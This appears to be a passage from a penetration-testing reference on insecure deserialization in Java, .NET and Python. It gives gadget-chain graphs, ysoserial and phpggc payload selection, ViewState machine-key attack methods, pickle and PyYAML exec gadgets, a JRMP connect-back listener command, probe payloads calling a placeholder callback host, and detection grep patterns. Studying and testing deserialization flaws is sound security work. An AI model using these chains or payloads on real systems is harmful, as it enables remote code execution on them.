Format-specific selection: for a target using Json.NET with `TypeNameHandling.Auto`, `ObjectDataProvider` is the go-to. For classic ASP.NET ViewState with a leaked machine key, `TextFormattingRunProperties` is the smaller payload and the more reliable exec.

### marshalsec (Bechler)

Format-agnostic thesis: "no matter how this process is performed and what implicit constraints are in place it is prone to similar exploitation techniques." Formats covered: BlazeDSAMF, Hessian, Burlap, Castor, Jackson, Java, JsonIO, JYAML, Kryo, KryoAltStrategy, Red5AMF, SnakeYAML, XStream, YAMLBeans. Formats reaching JDK-only RCE (no third-party dependency needed): JsonIO, JYAML, KryoAltStrategy, Red5AMF, SnakeYAML, XStream.

**Operational note** — marshalsec has no stable release; it intentionally bundles historical gadget dependencies (some of them with their own CVEs). Use only from a reviewed, pinned upstream commit for a specific research need; do not install it as a globally-available default tool. The Docker sandbox pattern is to build a specific commit with the exact dependency versions needed for the target, produce the payload, and discard the environment.

### phpggc (ambionics)

44 frameworks covered (full roster in the base file). The generator's chain-selection UX is `phpggc <framework>/<chain-type><chain-version> <arg1> <arg2>`; chain types include `RCE1..RCE9`, `INFO1..N`, `FI1..N` (file include), `FR1..N` (file read), `FW1..N` (file write), `SQLI1..N` (SQL injection). Each chain has a version-window annotation in the source (`@author`, `@version`).

**Framework-specific starter chain selection**:
- Laravel — `Laravel/RCE9` for modern Laravel (12.x); older windows use lower numbers.
- Symfony — `Symfony/RCE7` for modern Symfony (7.x).
- WordPress — `WordPress/RCE4` for WP 6.x; the plugin surface expands the chain roster wildly.
- Magento2 — `Magento/RCE1` for the CVE-2022-24086 lineage.
- Doctrine — `Doctrine/FW1` for file-write via the ORM.

The `-p phar` flag produces a PHAR file with the metadata already set to the serialized gadget — the delivery format for a PHAR-stream trigger. `-b` produces base64 output for direct HTTP delivery.

### Per-chain gadget-graph explanation — the top-frequency chains

Understanding the graph, not just the payload, tells you why a chain fires and predicts when a mitigation will break it.

**CommonsCollections1 (CC1)** — the classical CC chain. Graph: `AnnotationInvocationHandler.readObject` → `Map.entrySet()` → `LazyMap.get()` → `ChainedTransformer.transform()` → `InvokerTransformer.transform()` → `Method.invoke()` → `Runtime.exec()`. Preconditions: `commons-collections:3.1` and JDK ≤ 8u75. Post-8u76, JDK removed the `AnnotationInvocationHandler.readObject` invariant that this chain depended on, and the chain fails. CC3 and CC5/6/7 work around this with different entry points.

**CommonsCollections2 (CC2)** — targets `commons-collections:4.0`. Graph: `PriorityQueue.readObject` → `TransformingComparator.compare()` → `InvokerTransformer.transform()` → same tail as CC1. The `PriorityQueue` entry point sidesteps the JDK 8u76 fix.

**CommonsCollections5, 6, 7** — same tail (`InvokerTransformer.transform()` → `Runtime.exec()`), different entry points. CC5 uses `TiedMapEntry.hashCode`, CC6 uses `HashSet.readObject`, CC7 uses `Hashtable.readObject`. When one is blocked by a specific fix, another usually fires.

**Spring1** — graph: `MethodInvokeTypeProvider.readObject` → `ObjectFactory.getObject()` → arbitrary bean-factory dispatch. Requires Spring 4.x on classpath.

**Groovy1** — graph: `ConvertedClosure.invoke()` → `MethodClosure.doCall()` → `Runtime.exec()`. Requires `groovy-all:2.3.9`.

**Hibernate1** — graph: `PojoComponentTupilizer.getPropertyValue()` → `BasicPropertyAccessor$BasicGetter.get()` → `Method.invoke()`. Requires Hibernate 4.x. Useful when the app's main chain is blocked but Hibernate is on classpath.

**JRMPClient / JRMPListener** — no library requirement; JRMP-shape payload that reaches back to a listener the attacker runs on their own server. The chain: `RemoteObjectInvocationHandler.invokeRemoteMethod()` → `UnicastRef.invoke()` → outbound JRMP connection. The attacker runs `ysoserial JRMPListener 1099 CommonsCollections1 "id"` on their server; the payload triggers the target to connect back and deserialize the response with the attacker-chosen chain. Useful when the target has no known chain on classpath but has outbound network egress.

**URLDNS** — graph: `HashMap.readObject` → `HashMap.hash(key)` → `URL.hashCode()` → `URL.getHostAddress()` → DNS resolution. No exec, no library requirement beyond JDK. The safe probe.

**Chain-selection decision tree**: (a) URLDNS to confirm sink; (b) if outbound HTTP works, JRMPListener + your favorite tail; (c) fingerprint classpath, pick the smallest chain that fires; (d) if no chain fires, Sleeping Giants may apply — re-audit the dependency graph for recent changes matching the three modification patterns.

## Java Non-Native Marshallers — Depth

### Hessian / Burlap

Binary RPC formats deserialized by `HessianInput` / `Hessian2Input`. Attack graph:
- Client sends a Hessian-encoded object graph over HTTP or TCP.
- Server's `HessianInput.readObject()` reconstructs objects via reflection.
- Any class on classpath with a `readResolve` / `readReplace` / setter chain is reachable.

marshalsec's Hessian and Burlap payloads target `com.caucho.hessian.io.SerializerFactory` extensions plus JDK gadgets. The distinctive property: Hessian's binary encoding is not `AC ED`-prefixed, so WAF rules matching on Java native serialization miss Hessian traffic entirely. Detection: `Content-Type: application/x-hessian` or `application/hessian`, but many deployments serve it over generic `application/octet-stream`.

Verification: submit a benign Hessian-encoded `HashMap<String,String>` and observe the response. If the server accepts it, the deserializer is live; then escalate to gadget chains.

### Kryo

Kryo is a Java serialization framework optimized for speed, used heavily in Storm, Spark, Chronicle. Attack graph:
- Client sends a Kryo-encoded byte stream.
- Server's `Kryo.readClassAndObject()` reconstructs objects; the class name is embedded in the stream when `Kryo.setRegistrationRequired(false)` (the default).
- Any class on classpath is instantiable via reflection.

Mitigation: `Kryo.setRegistrationRequired(true)` restricts to an allow-list. Grep for the setting; absence + `readClassAndObject` reachable = live sink. `KryoAltStrategy` in marshalsec produces the JDK-only chain.

### JsonIO

`json-io` accepts a `@type` field naming the target class (echoes Jackson polymorphic typing but with different syntax). marshalsec targets it directly.

### YAMLBeans

Java's YAML library with type-tag support. Similar to SnakeYAML pre-2.0.

### BlazeDS AMF

Adobe Flex's binary format; still in production on legacy Flex apps. RCE chains reach reflection via `IExternalizable.readExternal`. marshalsec covers it. The AMF wire format: type-marker byte followed by type-specific encoding; type marker `0x11` is "typed object" carrying a class name. A crafted AMF payload with a gadget class name in the type marker fires on `AMF3Deserializer.readObject`.

### Red5 AMF

Same class as BlazeDS but with Red5-specific deserializer differences.

### WebLogic T3 protocol

Oracle WebLogic's proprietary remote-invocation protocol on 7001 (T3) / 7002 (T3s). The wire format carries serialized Java objects for RMI-style method invocation. Historical exploitation shape: any T3-listening WebLogic on the network accepts serialized objects, and until JEP 290 filters were enabled by default in WebLogic (11.x), the deserialization sink was unfiltered. Chain-selection: WebLogic-specific chains via `weblogic.jms.common.StreamMessageImpl` and adjacent classes; ysoserial has a `Weblogic1` payload variant. Post-JEP-290 WebLogic ships with a `weblogic.oif.serialFilter` list; the filter is subject to the same bypass classes as generic JEP 290 (allow-list-with-open-tail, wildcard-in-package, chain-through-allowed-collection).

Detection: `nmap -p7001 --script weblogic-t3-info` reports server version. Exploitation: `weblogic-tool` or hand-crafted T3 packet carrying a serialized chain.

### JBoss / WildFly EJB remoting

EJB remoting on 4447 (legacy) or 8080 with HTTP upgrade (modern). Serialized EJB stubs carry attacker payloads on the invocation path. Chain-selection: `JBossInterceptors1` and `JavassistWeld1` from ysoserial target this shape. On modern WildFly (post-16), the `elytron` security policy adds JEP 290 filters, but earlier versions and misconfigured deployments remain unfiltered.

### IBM WebSphere admin channel

WebSphere's SOAP-based admin channel on 8880/8879 carries serialized objects in some administrative RPC paths. Chain-selection: any `WebSphere`-tagged chain in ysoserial, plus general Java chains if the WebSphere-specific ones are blocked.

### Apache ActiveMQ / IBM MQ `ObjectMessage`

JMS queues that carry `javax.jms.ObjectMessage` reconstruct the payload with `ObjectInputStream` on the consumer side. Any web-tier producer that publishes attacker-controlled data to a queue, plus a worker-tier consumer that unmarshals via `ObjectMessage.getObject()`, is a live deserialization sink even when the web-tier itself has no direct exposure. JMET (jmet.jar) is the tooling; targets ActiveMQ, IBM MQ, RabbitMQ (with the JMS adapter), and generic AMQP with a Java serializer.

**Class-abstraction takeaway**: every Java marshaller that supports arbitrary type reconstruction is a deserialization sink, regardless of the wire format. The mitigation is at the unmarshaller (allow-list, type-registration-required, strict-type-mode), never at the wire format. The Sleeping Giants reframe applies here too — a marshaller allow-list that includes `commons-collections` is only safe as long as CC remains chain-free.

## .NET Formatter-Specific Bypasses

### `TypeNameHandling` values re-audit

The five values enumerate an ascending exposure ladder:
- `None` — safe. No polymorphic typing accepted.
- `Objects` — object types accepted; sink live.
- `Arrays` — array element types accepted; sink live.
- `Auto` — polymorphic when the declared property type differs from the runtime type; sink live and often invisible in code review because developers do not opt into it explicitly.
- `All` — polymorphic for both; sink live and maximal.

`SerializationBinder` can restrict allowed types via a manual allow-list, but a permissive binder or a missing binder collapses back to full `TypeNameHandling`. Grep for `JsonSerializerSettings` construction, `JsonConvert.DefaultSettings` (a global default that applies to every serializer in the process), and `SerializationBinder` implementations.

### `LosFormatter` / `SoapFormatter` / `NetDataContractSerializer` — same core primitive

All three deserialize attacker-named types. `LosFormatter` is the ViewState format; `SoapFormatter` is XML-shaped; `NetDataContractSerializer` accepts types from the wire (unlike `DataContractSerializer` which requires `KnownTypes`).

### `ObjectStateFormatter` (ViewState)

`__VIEWSTATE` blob format. Protected by a MAC keyed on the machine key. Bypass classes:
- **Machine key leaked or default** — the classical primitive. Sources: `web.config` in a public tree, `.git` snapshot, hardcoded-default-key databases, machine keys reused across environments.
- **`enableViewStateMac=false`** — legacy configuration where the MAC is disabled entirely. Historical but still found on unmigrated apps.
- **`viewStateEncryptionMode=Never`** on top of MAC-off — plaintext ViewState, no signature.
- **Weak MAC-key derivation** — some deployments use `machineKey`'s `IsolateApps` mode that derives the key from application path; a subdirectory-known attacker can pre-compute keys.
- **`__VIEWSTATEGENERATOR` mismatch** — the generator identifies the app root; a payload with the wrong generator is rejected. Enumerate by observing the target's own POSTs.

### `DataContractJsonSerializer` / `DataContractSerializer`

Safe if `KnownTypes` is a strict allow-list; unsafe if `KnownTypes` is derived from attacker input or is set to `AllowedTypes.All` (some third-party wrappers).

### `YamlDotNet`

Default `Deserializer` accepts `!<type>` tags naming any CLR type. Safe usage requires `WithNodeDeserializer` or a restricted type-resolver. Grep for `new Deserializer()` or `DeserializerBuilder` without a `WithTypeConverter` restriction.

### ViewState deep depth — MAC-attack methodology

**Machine-key acquisition** — the primary attack vector on ViewState. Sources catalogued:
- `web.config` served as static (misconfigured IIS handler for `.config` extension).
- `.git` snapshot including config files with the machine key.
- `machineKey` in `machine.config` on a shared-hosting deployment; adjacent tenants may have read access.
- Hardcoded default keys shipped in tutorials or vendor samples; several such keys are cataloged in public databases and remain in production years later.
- Key-derivation attacks: `IsolateApps` mode derives the key from application path plus a master key; a subdirectory-known attacker who can predict the derivation function can pre-compute per-path keys.
- The Blacklist3r-style tooling catalog of known-default keys is worth trying first — many enterprise deployments never rotate.

**MAC-off configurations** — `enableViewStateMac=false` is a compile-time or runtime flag that disables the ViewState signature entirely. Historical (pre-.NET 4.5.2) but still found on unmigrated apps. `viewStateEncryptionMode=Never` on top disables encryption; the combination gives plaintext-inspectable, unsigned ViewState.

**Generator matching** — `__VIEWSTATEGENERATOR` is a 4-byte hex hash derived from the target page path and app-relative path. Wrong generator causes MAC-validation failure even with the correct key. Enumerate by capturing a legitimate ViewState from the target and reading its generator; or by iterating known generator values.

**Path-and-apppath dependency** — the MAC input includes the URL path and the app-relative path. `ysoserial.net --path="/wrong.aspx"` fails MAC-check on `/right.aspx`. Match the actual request path.

**Algorithm negotiation** — the machine key config specifies both decryption (`AES` / `3DES`) and validation (`SHA1` / `HMACSHA256` / `HMACSHA512`) algorithms. The payload has to match; ysoserial.net's `--decryptionalg` and `--validationalg` flags carry this. Enumerate the algorithm from `machineKey` config disclosure.

### `NetDataContractSerializer` — always unsafe

Unlike `DataContractSerializer` which requires `KnownTypes`, `NetDataContractSerializer` reads the type from the wire and instantiates it directly. Any `NetDataContractSerializer.ReadObject` on untrusted input is RCE with an `ObjectDataProvider`-shape gadget. The class exists for legacy .NET Remoting; grep for `NetDataContractSerializer` in the source — every hit is a suspect sink.

### `SoapFormatter` and legacy XML deserialization

`SoapFormatter.Deserialize` accepts `<a1:xxx xmlns:a1="http://schemas.microsoft.com/clr/nsassem/...">` elements naming CLR types. Same gadget catalog as BinaryFormatter. The XML wire format lets attackers use SOAP-style envelopes to smuggle payloads through XML-inspecting middleware.

### `LosFormatter` beyond ViewState

`LosFormatter` (Limited Object Serialization) is used for ViewState but also exposed as a public class; some apps use it directly for compact serialization of arbitrary types. `LosFormatter.Deserialize(stream)` accepts type-embedded blobs and instantiates them, matching the ViewState gadget catalog. Any direct use of `LosFormatter.Deserialize` on non-ViewState input is a sink.

## Python Gadget-Class Frontier

Beyond the "any pickle load is RCE" base primitive, the advanced surface is the gadget-class catalog that lands via `__reduce__` and the delivery shapes.

### `__reduce__` gadget catalog

The gadget class defines `__reduce__` to return a `(callable, args_tuple)`. Pickle calls `callable(*args)` on unpickle. Common gadget callables:
- `os.system('cmd')` — direct shell.
- `subprocess.check_output(['cmd', 'arg'])` — argv-shape.
- `subprocess.Popen(['cmd'], stdout=subprocess.PIPE)` — background exec.
- `eval('code')` — code-string execution.
- `exec('code')` — statement execution.
- `builtins.__import__('os').system('cmd')` — namespace-fresh import.
- `getattr(__import__('os'), 'system')('cmd')` — attribute-access variant.
- `type("X", (), {})()` — dynamic class instantiation followed by method call.

The `pickle.REDUCE` opcode (`R`) is the wire-level marker; `fickling` (Trail of Bits) statically detects suspicious ops in a pickle stream — `GLOBAL` (import a module), `REDUCE` (call a function), `INST`/`OBJ` (instantiate an object). Any stream containing these ops on an untrusted source is suspicious.

### PyYAML tag gadget catalog

`!!python/object/apply:module.func [args]` — direct callable invocation.
`!!python/object/new:module.Class [args]` — instantiation with args.
`!!python/object:module.Class { field: value }` — instantiation with field assignment.
`!!python/name:module.name` — resolve a name (import + attribute).
`!!python/module:module` — import a module.

Each is blocked by `SafeLoader`; `FullLoader` blocks `apply`/`new` but allows the others; `UnsafeLoader` allows all.

### JsonPickle gadget catalog

`{"py/object": "module.Class", "field": "value"}` — instantiate a class and set fields.
`{"py/reduce": [...]}` — direct reduce-tuple.
`{"py/type": "module.Class"}` — resolve a type reference.
`{"py/repr": "..."}` — eval the repr string (some versions).
`{"py/newobj": [...]}` — `__new__` shape.

### `dill` / `cloudpickle` extensions

Both extend pickle to closures. A `dill.loads` on a payload that reconstructs a closure carrying `exec("attacker code")` in its cell is RCE. Class shape: the pickle protocol's opcode set is extended by `dill` to include closure serialization; the attacker payload uses the extended opcodes.

### Second-order in Python via Celery / RQ

Celery's historical default serializer was `pickle`; a task submitted with pickle-encoded args runs the pickle-load on the worker. Even with the modern `json` default, some tasks explicitly opt into pickle for "complex Python objects." Grep the Celery config for `task_serializer='pickle'` or `accept_content=['pickle']`.

### PyTorch weights_only bypass surface

The `weights_only=True` default (PyTorch 2.6+) restricts deserialization to tensor data, but the "safe" path has its own reflection surface: `torch.serialization._get_restore_location` and related reconstructor helpers accept type-name strings and dispatch to internal classes. Two 2025–2026 CVEs land RCE via reflection on this "safe" path. Load `insecure_deserialization_novel_deep.md § ML-Pipeline Deserialization — PyTorch weights_only Cluster` for the mechanism decomposition and the exact CVE numbers.

### `pandas.read_pickle` — a hidden sink

`pandas.read_pickle(path_or_buffer)` is a thin wrapper around `pickle.load` — grep hits for `pd.read_pickle` are RCE sinks whenever the buffer is attacker-controllable. Data-science pipelines that read `.pkl` files uploaded by users, or that fetch pickled DataFrames from S3 buckets, are the class shape. `pandas.read_hdf` (via HDF5 with `format='table'`) can also carry pickled objects; less common but real.

### `numpy.load` with `allow_pickle=True`

`numpy.load('file.npy', allow_pickle=True)` triggers pickle deserialization when the `.npy` file contains an object array. NumPy flipped the `allow_pickle` default from `True` to `False` in 1.16.3 (2019), but explicit `allow_pickle=True` still lands the sink. Grep for `np.load(...., allow_pickle=True)`.

### Airflow / Dagster / Prefect job payload pickling

Apache Airflow's XCom (cross-communication between tasks) historically used pickle as the serializer; a task pushing an XCom value that a downstream task pulls goes through pickle. `airflow.cfg`'s `[core] enable_xcom_pickling` flag controls it; default flipped in Airflow 2.x. But: any operator that explicitly returns a Python object relies on pickle even with the flag off (for the specific operators that opt in).

Dagster and Prefect have equivalent pickle-based inter-step data transfer. Grep the workflow definitions for `PickleIOManager` / `PicklePersistenceLayer` / `pickle_serializer`.

### Celery task-serializer settings

`CELERY_TASK_SERIALIZER = 'pickle'` (Celery 4+) or `CELERY_ACCEPT_CONTENT = ['pickle', 'json']` opens the pickle-shape task payload. Worker consuming an attacker-submitted task on a queue with `pickle` in accepted content deserializes on task pickup. The Celery security docs explicitly warn about this; grep the config for the settings.

### Ray / Dask cluster pickling

Ray's `ray.put(obj)` and `ray.get(ref)` transfer objects via pickle/cloudpickle across worker nodes. A Ray cluster with any externally-reachable API endpoint (Ray Dashboard, Ray Client server) that accepts task submission is a cluster-wide RCE surface. `read_webdataset` in `ray.data` uses `pickle.loads` and `torch.load(weights_only=False)` in its default decoder — a two-part sink that lands even with the PyTorch mitigation.

Dask's `dask.distributed.Client.submit(func, *args)` serializes with cloudpickle; the Scheduler and Worker endpoints on 8786 / 8787 accept task submissions.

### Model registries as deserialization sinks

MLflow's `mlflow.pyfunc.load_model` chains through the flavor-specific loader (sklearn, tensorflow, statsmodels, ...). Each flavor has its own pickle-adjacent path; MLflow's `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=False` gate is bypassable via specific flavors. HuggingFace's `AutoModel.from_pretrained(name_or_path)` loads via `torch.load` under the hood; even with the `weights_only=True` default, a malicious model triggers the reflection surface.

The class abstraction: any "load a model" verb across the Python ML ecosystem is a suspect deserialization sink, and version-gate mitigations advertised as complete typically are not.

## Confirmation Methodology at Advanced Depth

**When the target is production and destructive proofs are off-limits** — the finding must be provable with observation only. The advanced-tier method:

1. **Passive fingerprint** — capture the target's own POSTs (via a legitimate user session), extract the serialization format and library version from headers and cookie structures. No injection required.
2. **Sink-proof via error probe** — a payload that triggers a class-load error the app logs somewhere observable. The error's exact wording proves the deserializer ran; no exec required.
3. **Reachability-proof via version-boundary** — a payload that only works on the specific known-vulnerable version boundary. If the payload lands and the app fails safely, the target is on the fixed version; if it lands and produces RCE, the target is on the affected version. This is the "differential" confirmation.
4. **Chaining-proof via canary** — write a benign canary value to a controlled location (a session field, a database row the attacker can read). Observing the canary at the read path proves the write-then-read chain.

**Multi-endpoint corroboration** — a finding on one endpoint is stronger when corroborated by an adjacent endpoint. The same payload against `/api/v1/preferences` (JSON-typed) and `/rpc/legacy` (raw Java serialization) hitting the same backend proves the sink is a shared library, not endpoint-specific.

**Reproducibility artifact** — the finding report should include:
- Exact payload (hex/base64/text as delivered).
- Exact HTTP request (method, path, headers, body).
- Exact response (status, headers, body).
- Callback trace (OAST hit with source IP, timestamp, headers).
- Library and version identified.
- Fixed-version rebuttal result (submitted to staging or a patched adjacent instance).

**Confidence tiers** — the report should distinguish:
- **Confirmed** — RCE demonstrated, output captured, egress verified.
- **Reachable** — sink runs, callback fires, but exec not yet demonstrated (RCE possible but chain not selected).
- **Suspected** — sink signature present but no callback and no error probe response — needs another confirmation approach.

**Probe-payload catalogue per format**:

- **Java native** — the URLDNS probe as `ysoserial URLDNS "http://<oast>"` base64-encoded; a broken-magic probe `AC ED 00 05 FF` (invalid opcode) to trigger an in-graph parse error.
- **PHP unserialize** — a nonexistent class name `O:20:"NonExistentEvilClass":0:{}` produces a class-not-found error the app may log; a benign `phpggc -b Monolog/FW1 /tmp/x calc` (file-write, not exec) if the FW gadget is safer than RCE.
- **.NET Json.NET** — `{"$type":"System.NonExistentType, mscorlib"}` produces a `JsonSerializationException` with the type name.
- **.NET BinaryFormatter** — a header-only stream `00 01 00 00 00 FF FF FF FF 01 00 00 00 00 00 00 00 06 01 00 00 00` with no body triggers an in-graph parse error.
- **Python pickle** — `\x80\x04\x95` (protocol 4 prefix) plus a `GLOBAL "nonexistent_module" "nonexistent_func"` opcode produces an `ImportError`.
- **Python YAML** — `!!python/object:nonexistent.Class {}` produces a `ConstructorError` with the module name.
- **Node.js `node-serialize`** — `{"a":"_$$ND_FUNC$$_function(){require('dns').lookup('<oast>',()=>{})}()"}`.
- **Ruby Marshal** — `Marshal.dump(NonExistentClass.new)` produces a `TypeError`; alternate: a byte-level `\x04\x08I"nonexistent\x06:\x06ET` triggers class-not-found.

Each probe is designed to (a) prove the sink runs by producing a format-specific error, and (b) not execute anything. The error propagation channel is where the confirmation lands: the app's HTTP response, an error log, an admin dashboard, a support-ticket auto-reply.

**Passive-only fingerprint techniques**:
- Cookie shape analysis: `.ASPXAUTH` cookies have `LosFormatter`-typical byte distribution; a `SESS...` PHP session cookie has serialized-object patterns; a Rails `_session=` has Marshal or JSON depending on the app's config.
- Header disclosure: `X-Powered-By: PHP/8.4.5`, `Server: Apache-Coyote/1.1` (Tomcat), `X-AspNet-Version: 4.0.30319`, `X-AspNetMvc-Version: 5.2`.
- Error-page disclosure: 500 errors that expose stack traces, class names, JAR file paths.
- Public-registry search: the target's `robots.txt`, sitemap, or public docs sometimes reveal framework versions.

**Diff-based verification** — comparing legitimate app POSTs against captured payloads. A modified cookie that produces a class-not-found error, then reverts to the original that produces a valid response, proves the app deserializes the cookie on every request. This is stealthy — no attack payload is fired, just a byte flip in an otherwise-legitimate session.

## Chain-Primitive Composition — Advanced Cases

Beyond the base file's chaining catalog, the advanced cases combine multiple primitives to reach targets the direct chain cannot:

**Deserialization → SQL injection via `PreparedStatement`-in-gadget** — a gadget chain that reaches a `Connection.prepareStatement(String)` sink lets the attacker execute arbitrary SQL from within the deserialization primitive. The SQL runs as the app's DB user (usually elevated). Route the SQL side to `sql_injection.md`. The chain-shape example: `LazyMap` calling a factory transformer that returns a `Connection` interface proxy, then invoking `prepareStatement` with an attacker-crafted string. The SQL executes in the app's transaction context — visible in database audit logs as legitimate app queries.

**Deserialization → SSRF via `URL.openConnection` gadget** — beyond the URLDNS probe, a chain that reaches full HTTP request construction (via `HttpURLConnection` or a Java HTTP client library) turns the deserialization primitive into a general-purpose SSRF vehicle. Route the reachability enumeration to `ssrf.md`. The class distinction: the URLDNS probe only performs `hashCode()` (DNS resolution); a full-HTTP chain performs `openConnection().getInputStream().read()` (real HTTP request-response). Both prove reachability but the HTTP chain lets you reach IMDS/internal APIs.

**Deserialization → template injection via reachable renderer** — a chain that constructs a template-renderer instance with attacker-controlled input reaches SSTI. On Java targets with Freemarker, Velocity, or Thymeleaf on classpath, this is a viable chain shape. Route the template-engine side to `ssti.md`. Concrete example: constructing a Freemarker `Configuration` with `UNRESTRICTED_RESOLVER` and calling `getTemplate("dummy")` then rendering with an attacker-controlled data model that reaches `?new "freemarker.template.utility.Execute"`.

**Deserialization → XXE via SAX-parser gadget** — a chain reaching a `SAXParser.parse(InputSource)` sink with attacker-controlled XML enables XXE from within the deserialization primitive. Route to `xxe.md`. Chain graph: any gadget that instantiates `SAXParserFactory` and passes an attacker-controlled `InputSource` reaches the XXE surface with full external-entity resolution.

**Deserialization → path-traversal via `File`-constructor gadget** — a chain that constructs `new File(attackerPath)` and reads or writes gives file-system access without needing a separate path-traversal primitive. Route to `path_traversal_lfi_rfi.md`.

**Deserialization → LDAP-injection via `DirContext.search` gadget** — a chain that constructs a `DirContext` and calls `.search()` with attacker-controlled filters exposes LDAP injection from within the primitive. Route to `ldap_injection.md`.

**Deserialization → RCE-via-JNDI-reference-in-locally-reachable-factory** — when remote codebase loading is disabled (post-JDK-8u191), a JNDI reference can still reach RCE if the returned object triggers a local `ObjectFactory` whose `getObjectInstance` performs a dangerous operation. The chain: `Reference` returned from the LDAP responder → `NamingManager.getObjectInstance(ref)` → local factory constructor → dangerous side effect. Requires knowing what local factories are on classpath (Xalan's `TemplatesImpl` is the classical example).

**Deserialization → reflection-into-JVM-internals** — some gadgets reach `sun.misc.Unsafe.putObject` or `MethodHandles.Lookup` internals; the primitive becomes not just "run code" but "corrupt the JVM state." Post-JDK 17 the module system limits many of these, but pre-17 they remain the "reach anywhere" primitive.

**Deserialization → JMX bean invocation** — a chain reaching `MBeanServerConnection.invoke()` can invoke any exposed MBean method with attacker-chosen args. On JVMs with JMX enabled and Tomcat's `MBeanServerFactory` on classpath, this reaches management operations including thread manipulation and class-loader operations.

Each composition adds capability: (deserialization → arbitrary Java code) × (Java code → SQL/HTTP/template/XML/file/LDAP/JVM/JMX access) = compound capability that a filter watching only one primitive misses.

**Compound-chain construction methodology** — building a compound chain requires:
1. **Base primitive** — pick a working ysoserial chain for the target's classpath.
2. **Inner sink identification** — decide which secondary primitive (SQL / HTTP / etc.) is desired.
3. **Bridge class** — a class on classpath whose method invocation combines the two. `LazyMap` + `ChainedTransformer` gives arbitrary method-invocation chaining; extending with a transformer that constructs the inner sink's argument completes the chain.
4. **Payload assembly** — serialize the compound graph with `ysoserial --custom` or a manual `ObjectOutputStream` build. Test locally against a mirror of the target's classpath before firing.

## Detection at Advanced Depth

**Static analysis** — Tabby, AndroChain, and the newer FLASH (USENIX'25) are the top-tier gadget-chain reachability detectors. FLASH's headline: 30.8% lower false-negative rate and 25.9% lower false-positive rate than baselines on 30 apps. Run one of these against the target's JAR set to enumerate reachable chains without executing anything.

**Dynamic analysis** — instrument the JVM with a Java agent that hooks `ObjectInputStream.readObject` and logs every deserialized class name. During normal traffic, capture the class-name histogram; during an attack, spike detection identifies unusual classes.

**SAST-tier grep** — beyond the base file's grep list, the advanced patterns:
```
grep -r 'ObjectInputStream\|readObject\|readResolve\|readReplace\|readExternal' src/
grep -r 'setObjectInputFilter\|createFilter\|allowFilter' src/
grep -r 'TypeFactory.defaultInstance\|constructFromCanonical' src/
grep -r 'HessianInput\|Hessian2Input\|Kryo\|BinaryFormatter' src/
grep -r 'SnakeYAML\|Yaml(\|SafeConstructor\|Constructor(' src/
```

**Runtime fingerprint** — a fingerprint request that deliberately probes for library versions:
```
POST /api/preferences HTTP/1.1
Content-Type: application/x-java-serialized-object
X-Debug-Enable: 1

<crafted-Java-serialized-blob-with-invalid-class>
```
The response class-name in the stack trace tells you library and version. Some apps disable debug output; try adjacent endpoints that may leak more (`/error`, `/health`, `/debug`).

**Instrumentation-based detection for CI** — hook the deserialize call sites with `ByteBuddy` or `Javassist` and record every class encountered. A CI test run that submits fuzzed serialized inputs captures the reachable class graph, which then feeds a filter allow-list.

**Detection tooling operational shape** — running FLASH / Tabby / AndroChain requires the target's classpath JARs. Extract from a WAR/JAR bundle, from a JVM heap dump (`jmap -dump:file=heap.hprof <pid>` then extract), or by walking the app's Maven `dependency:tree`. The detector produces a reachability report; interpret as "here are the chains present in the current dependency snapshot," subject to change on the next bump per Sleeping Giants.

## Wire-Format Fingerprint Catalog

Reading the wire format tells you what parser will run before the parser runs it — critical for both offensive selection and defensive validation.

**Java native serialization** — every stream starts with a 4-byte magic + version: `AC ED 00 05` (protocol 5, the current default since JDK 6). The next byte is a type-code (`TC_OBJECT=0x73`, `TC_CLASSDESC=0x72`, `TC_STRING=0x74`, `TC_ARRAY=0x75`, `TC_CLASS=0x76`, `TC_BLOCKDATA=0x77`, `TC_ENDBLOCKDATA=0x78`, `TC_RESET=0x79`, `TC_BLOCKDATALONG=0x7a`, `TC_EXCEPTION=0x7b`, `TC_LONGSTRING=0x7c`, `TC_PROXYCLASSDESC=0x7d`, `TC_ENUM=0x7e`). A `TC_CLASSDESC` is followed by a 2-byte length + UTF-8 class name — reading this reveals the first class in the graph.

**PHP unserialize** — text format. Type-prefix syntax: `s:` for string, `i:` for integer, `d:` for double, `b:` for boolean, `a:` for array, `O:` for object, `N;` for null. `O:5:"MyCls":2:{s:1:"a";s:1:"b";s:1:"c";i:42;}` is an `MyCls` object with two properties. The class name is at bytes 4-8 of the object marker; the property list follows.

**.NET BinaryFormatter** — starts with a 21-byte header: `00 01 00 00 00 FF FF FF FF 01 00 00 00 00 00 00 00 06 01 00 00 00`. This is the "SerializedStreamHeader" plus root record marker plus binary-array record marker. The next bytes are the string table and object records. Full parse requires a `BinaryFormatter` implementation but the header alone is diagnostic.

**.NET LosFormatter (ViewState)** — base64-encoded when transmitted in `__VIEWSTATE`. Decoded starts with a version byte (`0xFF` for current) followed by a token stream: `01` (empty token), `02 <int>` (Int32), `03 <byte>` (Byte), etc. `<f><val>` pattern for typed values.

**Python pickle** — protocol byte + opcodes. `\x80\x04` (protocol 4) or `\x80\x05` (protocol 5) at the start. Opcodes include `\x8c` (SHORT_BINUNICODE), `\x94` (MEMOIZE), `\x8f` (EMPTY_SET), `R` (REDUCE — call a function), `c` (GLOBAL — import a name), `.` (STOP). The presence of `R` on an untrusted stream is the RCE-primitive marker.

**Python YAML** — text; the `!!` prefix denotes an explicit type tag: `!!python/object/apply:os.system` is the classical RCE payload. `!!python/name:module.attr` resolves a name; `!!python/module:mod` imports a module.

**MessagePack** — binary. First byte encodes the type: `0x80-0x8F` fixmap, `0x90-0x9F` fixarray, `0xA0-0xBF` fixstr, `0xC0` nil, `0xC2` false, `0xC3` true, `0xCC-0xCF` uint 8/16/32/64, `0xD0-0xD3` int 8/16/32/64, `0xD4-0xD8` fixext (extension types 1/2/4/8/16 bytes), `0xC7-0xC9` ext 8/16/32. Extension types with attacker-controlled ext-type numbers are the covert-deserialization surface.

**CBOR** — binary. Major type in the top 3 bits: 0 (uint), 1 (nint), 2 (bstr), 3 (tstr), 4 (arr), 5 (map), 6 (tag), 7 (float/simple). Major type 6 (tag) with a user-registered handler is the callback surface.

**BSON** — binary. Little-endian document with a leading 4-byte length. Element type codes: `\x01` double, `\x02` string, `\x03` embedded doc, `\x04` array, `\x05` binary, `\x08` boolean, `\x0F` code_w_scope (the legacy JavaScript-callable code+scope pair).

**Hessian2** — binary. Magic byte `H` (0x48) plus version byte for Hessian 2.0; typed objects begin with `M` (0x4D) or `O` (0x4F). Class definition and object instantiation are separate wire elements.

